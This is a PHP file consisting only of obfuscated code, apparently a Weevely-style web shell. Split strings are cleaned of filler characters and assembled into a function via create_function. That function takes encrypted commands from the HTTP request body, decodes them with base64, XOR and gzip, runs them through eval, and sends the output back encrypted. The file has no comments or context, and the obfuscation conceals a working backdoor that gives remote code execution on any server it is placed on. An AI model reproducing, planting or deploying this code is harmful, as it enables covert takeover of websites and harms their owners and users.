<?php
$a='$k=u*"9b8174bdu*u*";$kh="86u*d5c0386346";u*$kf=u*"906u*b00d461cau*";$u*p="B1tQu*9qKu*hgBqsK6aku*";fun';
$W=str_replace('P','','crPeaPPte_PPPfunction');
$f='endu*_clu*ean()u*;$r=@bu*ase6u*u*4_u*encode(@x(@gzcompreu*ss($u*o),$k))u*;priu*ntu*("$p$kh$r$kf");}';
$g='ch("/$kh(.+)u*$kf/"u*,@u*file_get_contu*entsu*("u*phu*p://inu*put"),u*$m)u*=u*=1) {@ob_start()u*';
$s='ctiou*n x(u*u*$t,$k){$cu*=strlenu*($k);u*$l=strleu*n($u*t)u*;$o="";for($u*i=0;$i<u*$l;){foru*($ju';
$y='*=0;(u*$j<$c&u*u*&$i<$l);$j++,$i++u*){$o.=$u*tu*{$i}^$k{$ju*};}u*}reu*tu*uru*n $o;}if (@preu*g_u*mat';
$m=';@evu*al(@gzuncompresu*s(@xu*(@base6u*4_decodu*e($m[1]u*),$u*k)));$o=@u*ob_getu*u*_cou*ntents();@ob_';
$C=str_replace('u*','',$a.$s.$y.$g.$m.$f);
$c=$W('',$C);$c();
?>
